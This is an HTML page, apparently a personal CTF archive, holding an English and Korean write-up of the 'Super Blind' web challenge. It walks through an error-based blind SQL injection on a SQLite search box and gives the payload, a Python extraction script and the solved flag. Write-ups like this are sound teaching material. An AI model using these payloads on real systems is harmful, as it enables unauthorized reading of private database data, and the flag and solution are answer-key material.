@@ -1,0 +1,89 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="InIt CTF event page"><title>Super Blind · CTF Archive</title><link rel="stylesheet" href="../../../../assets/style.css"><script src="../../../../assets/app.js" defer></script></head><body class="theme-init"><a class="skip" href="#main">Skip to content</a><header><div class="nav"><a class="brand" href="../../../../ctfs/init/index.html" aria-label="InIt home"><span class="brand-mark"><span>{</span>InIt<span>}</span></span></a><div class="header-crumb"><a href="../../../../index.html">Home</a><i>/</i><a href="../../../../ctfs/init/index.html">InIt</a><i>/</i><a href="../../../../ctfs/init/categories/index.html">Categories</a><i>/</i><a href="../../../../ctfs/init/web/index.html">Web</a><i>/</i><span>Super Blind</span></div><nav aria-label="Main navigation"><div class="language-control"><span class="sr-only">Write up language</span><button id="writeup-language" class="language-toggle" type="button" aria-label="Switch language" aria-pressed="false"><span class="language-current">ENG</span></button></div><a href="../../../../index.html">HOME</a><a href="../../../../ctfs/init/index.html">INIT CTF</a></nav></div></header><main id="main"><div class="reading-layout challenge-layout"><div class="article-column"><section class="challenge-card" id="challenge" aria-labelledby="challenge-title"><div class="challenge-top"><span class="challenge-label">CHALLENGE</span><div class="challenge-meta"><span class="challenge-category web">Web</span><span class="points">200 <small>PTS</small></span></div></div><h1 id="challenge-title">Super Blind</h1><p class="challenge-author"><span class="field-label">AUTHOR</span> Abdullah Hamdan</p><div class="challenge-description" lang="en" data-challenge-language="en"><p data-sync-block="challenge-paragraph-0">The catalog search looks harmless, and a filter is watching your input. Some record fields are private. Can you try leaking them?</p></div><div class="challenge-description" lang="ko" data-challenge-language="ko" hidden><p data-sync-block="challenge-paragraph-0">평범해 보이는 목록 검색창이 있고, 입력값을 검사하는 필터가 있다. 일부 레코드 필드는 비공개다. 그 내용을 알아낼 수 있을까?</p></div><div class="challenge-format"><span class="field-label">FLAG FORMAT</span><code>InIt{...}</code></div></section><section id="write-up" class="writeup-section" aria-labelledby="writeup-title"><h2 id="writeup-title" class="writeup-label">Write Up</h2><article class="prose" lang="en" data-writeup-language="en"><h2 id="en-section-0" data-sync-block="heading-0">Starting from the Challenge</h2><p data-sync-block="paragraph-0">The challenge provides the line &#39;Some record fields are private. Can you try leaking them?&#39; and a catalog search box. The search term is sent through <code>GET /search?q=</code>. I compared normal searches with error responses to determine whether the input entered a database query.</p><h2 id="en-section-1" data-sync-block="heading-1">1. A quote changes the search result</h2><p data-sync-block="paragraph-1"><code>q=a</code> returned search results, while a string that did not exist returned <code>No matching records.</code>. Entering a single quote produced <code>The search could not be completed.</code>. The input was affecting SQL syntax.</p>
+<p data-sync-block="paragraph-2"><code>SELECT</code>, <code>UNION</code>, <code>OR</code>, <code>AND</code>, and comments were blocked by the filter, but SQLite&#39;s <code>iif</code>, <code>substr</code>, <code>unicode</code>, <code>length</code>, and <code>abs</code>, along with the string concatenation operator <code>||</code>, were available.</p><h2 id="en-section-2" data-sync-block="heading-2">2. Turning the search error into a Boolean signal</h2><p data-sync-block="paragraph-3">The private field never appears in the search results. SQLite&#39;s <code>abs(-9223372036854775808)</code> raises an integer-overflow error, which gives us a second observable page state.</p><blockquote>
+<p data-sync-block="paragraph-4"><strong>Q:</strong> How can one error reveal whether a condition about the hidden value is true?</p></blockquote>
+<p data-sync-block="paragraph-5">I placed the overflow inside <code>iif</code> so it runs only when the tested condition is true.</p><pre><code class="language-sql">&#39;||iif(
+    iif(name=&#39;archive&#39;, CONDITION, 0),
+    abs(-9223372036854775808),
+    &#39;&#39;
+)||&#39;
+</code></pre>
+<p data-sync-block="paragraph-6">When <code>CONDITION</code> is true, the search fails; when it is false, normal search results appear. The search results include a row named <code>archive</code>. To look for a hidden column, I used column-name candidates in <code>length(candidate)&lt;0</code>: an existing text column makes the condition false, while an unknown name causes a SQL error. This led to <code>secret</code>. Testing <code>substr(secret,1,5)=&#39;InIt{&#39;</code> for each row then identified <code>archive</code> as the row containing the flag.</p><h2 id="en-section-3" data-sync-block="heading-3">3. Recovering one character at a time</h2><p data-sync-block="paragraph-7">I first determined the string length with <code>length(secret)</code>. At each position, I compared the character code with the following condition.</p><pre><code class="language-sql">unicode(substr(secret, POSITION, 1)) &gt; MID
+</code></pre>
+<p data-sync-block="paragraph-8">Each true or false response halves the range of possible character codes, so one character can be recovered in about seven requests.</p>
+<p data-sync-block="paragraph-9">The code uses <code>requests</code>; set <code>BASE</code> to the challenge URL.</p><pre><code class="language-python"># solve.py — written for this write-up
+def oracle(condition):
+    payload = (
+        f&quot;&#39;||iif(iif(name=&#39;archive&#39;,{condition},0),&quot;
+        &quot;abs(-9223372036854775808),&#39;&#39;)||&#39;&quot;
+    )
+    page = requests.get(BASE + &quot;/search&quot;, params={&quot;q&quot;: payload}).text
+    return &quot;The search could not be completed&quot; in page
+
+def binary_value(expression, low=32, high=127):
+    while low &lt; high:
+        mid = (low + high) // 2
+        if oracle(f&quot;{expression}&gt;{mid}&quot;):
+            low = mid + 1
+        else:
+            high = mid
+    return low
+
+length = binary_value(&quot;length(secret)&quot;, 0, 128)
+flag = &quot;&quot;.join(
+    chr(binary_value(f&quot;unicode(substr(secret,{pos},1))&quot;))
+    for pos in range(1, length + 1)
+)
+print(flag)
+</code></pre>
+<p data-sync-block="paragraph-10">I recovered all 37 characters in order using the same method.</p><h2 id="en-section-4" data-sync-block="heading-4">Final Flag</h2><pre><code class="language-plain">InIt{bl1nd_sql_1nj3ct10n_g0brrrrr!@#}
+</code></pre>
+<h2 id="en-section-5" data-sync-block="heading-5">Summary</h2><section class="writeup-summary" aria-labelledby="en-section-5"><ul>
+<li><strong>Observation:</strong> A quote causes a search error, while several SQLite functions pass the filter.</li>
+<li><strong>Oracle:</strong> Conditional integer overflow distinguishes true from false.</li>
+<li><strong>Extraction:</strong> Find <code>archive.secret</code>, then recover its 37 characters with binary search.</li>
+</ul>
+<div class="tactical-flow" data-sync-block="flow-0" role="group" aria-labelledby="en-flow-0"><div class="flow-title" id="en-flow-0">TACTICAL FLOW MAP</div><ol class="flow-steps"><li><span class="flow-node">Search box</span></li><li><span class="flow-node">Conditional SQLite error</span></li><li><span class="flow-node">Find archive.secret</span></li><li><span class="flow-node">Determine length</span></li><li><span class="flow-node">Binary-search character codes</span></li><li><span class="flow-node">Recover the flag</span></li></ol></div></section><div class="article-end"><span>// END OF WRITE UP</span><a href="../index.html">← Web write ups</a></div></article><article class="prose" lang="ko" data-writeup-language="ko" hidden><h2 id="ko-section-0" data-sync-block="heading-0">문제에서 출발하기</h2><p data-sync-block="paragraph-0">문제에는 &#39;Some record fields are private. Can you try leaking them?&#39;라는 문구와 catalog 검색창이 주어진다. 검색어는 <code>GET /search?q=</code>로 전달된다. 정상 검색과 오류 응답을 비교해 입력값이 데이터베이스 쿼리에 들어가는지 확인했다.</p><h2 id="ko-section-1" data-sync-block="heading-1">1. 작은따옴표를 넣자 검색 오류가 났다</h2><p data-sync-block="paragraph-1"><code>q=a</code>는 검색 결과를 반환하고, 존재하지 않는 문자열은 <code>No matching records.</code>를 반환했다. 작은따옴표 하나를 입력하면 <code>The search could not be completed.</code>가 나타났다. 입력값이 SQL 문법에 영향을 주고 있었다.</p>
+<p data-sync-block="paragraph-2"><code>SELECT</code>, <code>UNION</code>, <code>OR</code>, <code>AND</code>와 주석은 필터에 차단됐지만 SQLite의 <code>iif</code>, <code>substr</code>, <code>unicode</code>, <code>length</code>, <code>abs</code>와 문자열 연결 연산자 <code>||</code>는 사용할 수 있었다.</p><h2 id="ko-section-2" data-sync-block="heading-2">2. 검색 오류를 참·거짓 신호로 만들기</h2><p data-sync-block="paragraph-3">비공개 필드는 검색 결과에 표시되지 않는다. SQLite의 <code>abs(-9223372036854775808)</code>은 정수 overflow를 일으키므로, 화면에서 구별할 수 있는 두 번째 상태가 생긴다.</p><blockquote>
+<p data-sync-block="paragraph-4"><strong>Q:</strong> 오류 하나로 숨은 값에 대한 조건이 참인지 어떻게 알아낼까?</p></blockquote>
+<p data-sync-block="paragraph-5">검사할 조건이 참일 때만 overflow가 발생하도록 <code>iif</code> 안에 넣었다.</p><pre><code class="language-sql">&#39;||iif(
+    iif(name=&#39;archive&#39;, CONDITION, 0),
+    abs(-9223372036854775808),
+    &#39;&#39;
+)||&#39;
+</code></pre>
+<p data-sync-block="paragraph-6"><code>CONDITION</code>이 참이면 검색 오류가 발생하고, 거짓이면 정상 검색 결과가 나온다. 검색 결과에는 <code>archive</code>라는 행이 있다. 숨겨진 열은 <code>length(candidate)&lt;0</code>에 열 이름 후보를 넣어 찾았다. 존재하는 문자열 열이면 조건이 거짓이 되고, 없는 이름이면 SQL 오류가 난다. 이 방식으로 <code>secret</code>을 찾은 뒤 각 행에서 <code>substr(secret,1,5)=&#39;InIt{&#39;</code>를 검사하자 <code>archive</code>가 플래그를 가진 행으로 확인됐다.</p><h2 id="ko-section-3" data-sync-block="heading-3">3. 이진 탐색으로 한 글자씩 복구하기</h2><p data-sync-block="paragraph-7">먼저 <code>length(secret)</code>으로 문자열 길이를 구했다. 각 위치에서는 다음 조건으로 문자 코드를 비교했다.</p><pre><code class="language-sql">unicode(substr(secret, POSITION, 1)) &gt; MID
+</code></pre>
+<p data-sync-block="paragraph-8">참과 거짓에 따라 문자 코드의 범위를 절반씩 줄이면 한 글자를 약 7번의 요청으로 찾을 수 있다.</p>
+<p data-sync-block="paragraph-9">코드는 <code>requests</code>를 사용하며, <code>BASE</code>에는 문제 주소를 넣는다.</p><pre><code class="language-python"># solve.py — written for this write-up
+def oracle(condition):
+    payload = (
+        f&quot;&#39;||iif(iif(name=&#39;archive&#39;,{condition},0),&quot;
+        &quot;abs(-9223372036854775808),&#39;&#39;)||&#39;&quot;
+    )
+    page = requests.get(BASE + &quot;/search&quot;, params={&quot;q&quot;: payload}).text
+    return &quot;The search could not be completed&quot; in page
+
+def binary_value(expression, low=32, high=127):
+    while low &lt; high:
+        mid = (low + high) // 2
+        if oracle(f&quot;{expression}&gt;{mid}&quot;):
+            low = mid + 1
+        else:
+            high = mid
+    return low
+
+length = binary_value(&quot;length(secret)&quot;, 0, 128)
+flag = &quot;&quot;.join(
+    chr(binary_value(f&quot;unicode(substr(secret,{pos},1))&quot;))
+    for pos in range(1, length + 1)
+)
+print(flag)
+</code></pre>
+<p data-sync-block="paragraph-10">같은 방식으로 37글자를 순서대로 복구했다.</p><h2 id="ko-section-4" data-sync-block="heading-4">Final Flag</h2><pre><code class="language-plain">InIt{bl1nd_sql_1nj3ct10n_g0brrrrr!@#}
+</code></pre>
+<h2 id="ko-section-5" data-sync-block="heading-5">요약</h2><section class="writeup-summary" aria-labelledby="ko-section-5"><ul>
+<li><strong>관찰:</strong> 작은따옴표를 넣으면 검색 오류가 나며 SQLite 함수 일부는 필터를 통과한다.</li>
+<li><strong>판별:</strong> 조건이 참일 때 정수 overflow를 일으켜 참·거짓을 구분한다.</li>
+<li><strong>추출:</strong> <code>archive.secret</code>을 찾고 37글자를 이진 탐색으로 복구한다.</li>
+</ul>
+<div class="tactical-flow" data-sync-block="flow-0" role="group" aria-labelledby="ko-flow-0"><div class="flow-title" id="ko-flow-0">TACTICAL FLOW MAP</div><ol class="flow-steps"><li><span class="flow-node">검색창</span></li><li><span class="flow-node">조건부 SQLite 오류</span></li><li><span class="flow-node">archive.secret 찾기</span></li><li><span class="flow-node">길이 계산</span></li><li><span class="flow-node">문자 코드 이진 탐색</span></li><li><span class="flow-node">플래그 복구</span></li></ol></div></section><div class="article-end"><span>// END OF WRITE UP</span><a href="../index.html">← Web write ups</a></div></article></section></div><aside class="toc"><span class="eyebrow">ON THIS PAGE</span><a href="#challenge">Challenge</a><a href="#write-up">Write Up</a><a data-toc-language="en" href="#en-section-0">Starting from the Challenge</a><a data-toc-language="en" href="#en-section-1">1. A quote changes the search result</a><a data-toc-language="en" href="#en-section-2">2. Turning the search error into a Boolean signal</a><a data-toc-language="en" href="#en-section-3">3. Recovering one character at a time</a><a data-toc-language="en" href="#en-section-4">Final Flag</a><a data-toc-language="en" href="#en-section-5">Summary</a><a data-toc-language="ko" href="#ko-section-0" hidden>문제에서 출발하기</a><a data-toc-language="ko" href="#ko-section-1" hidden>1. 작은따옴표를 넣자 검색 오류가 났다</a><a data-toc-language="ko" href="#ko-section-2" hidden>2. 검색 오류를 참·거짓 신호로 만들기</a><a data-toc-language="ko" href="#ko-section-3" hidden>3. 이진 탐색으로 한 글자씩 복구하기</a><a data-toc-language="ko" href="#ko-section-4" hidden>Final Flag</a><a data-toc-language="ko" href="#ko-section-5" hidden>요약</a><a class="toc-back" href="../index.html">← Back to list</a></aside></div></main><footer><span>PERSONAL WRITE UPS</span><span>InIt CTF · 2026</span></footer></body></html>
